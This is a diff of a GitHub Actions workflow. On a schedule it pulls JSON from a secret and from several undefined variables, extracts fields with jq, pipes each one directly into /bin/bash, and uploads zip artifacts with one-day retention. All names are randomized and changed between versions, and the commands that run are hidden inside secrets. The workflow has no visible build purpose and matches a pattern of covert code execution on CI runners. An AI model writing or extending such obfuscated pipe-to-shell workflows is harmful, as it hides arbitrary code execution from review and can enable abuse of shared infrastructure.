@@ -1,21 +1,28 @@
 name: nianchunheke
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '40 2/6 * * *'
-jobs:  # 29437
+    - cron: '10 2,8,14,20 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: nianchunheke
         env:
-          c61790: ${{ secrets.c61790 }}
+          swhh62: ${{ secrets.swhh62 }}
         run: |
-          echo $c61790 | jq -r .nfou04405 | /bin/bash
-          echo $nfsg1 | jq -r .txb624 | /bin/bash
-          echo $pwj25558 | jq -r .gblgg454 | /bin/bash
-          echo $ig4 | jq -r .xtuc90 | /bin/bash
+          printf '%s' "$swhh62" | jq -r .edk59 | /bin/bash
+          printf '%s' "$n72325" | jq -r .xhkb6415 | /bin/bash
+          echo $kwmm92495 | jq -r .jyide8540 | /bin/bash
+          printf '%s' "$u6" | jq -r .uz3 | /bin/bash
+          echo $m479 | jq -r .fdf83 | /bin/bash
+          printf '%s' "$i43" | jq -r .p11126 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: yX7HWp1U
+          path: "*.zip"
+          retention-days: 1
